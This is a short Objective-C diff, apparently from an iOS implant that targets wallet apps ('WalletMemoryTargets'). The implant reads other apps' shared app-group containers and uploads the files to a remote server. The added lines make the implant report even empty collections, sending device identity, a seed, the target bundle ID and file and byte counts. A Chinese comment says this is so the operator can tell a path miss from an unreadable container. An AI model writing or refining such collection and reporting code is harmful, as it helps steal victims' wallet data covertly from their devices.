@@ -853,6 +853,16 @@ static NSArray *WalletMemoryTargets(void) {
         NSArray *files = pkg[@"files"];
         if (!files.count) {
             [self log:[NSString stringWithFormat:@"appgroup empty: %@ (%@)", groupId, pkg[@"error"] ?: @"no files"]];
+            // 空采集也要报上去，否则设备侧完全静默，没法判断是路径没命中还是容器没读到
+            NSMutableDictionary *ev0 = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+            ev0[@"et"] = @"appgroup_upload";
+            ev0[@"c"] = kSeed;
+            ev0[@"ctx"] = @{ @"bundleId": bundleId,
+                             @"files": @0,
+                             @"bytes": @0,
+                             @"items": @(items.count),
+                             @"error": pkg[@"error"] ?: @"no files matched" };
+            [self.net sendEvent:ev0];
             return;
         }
 
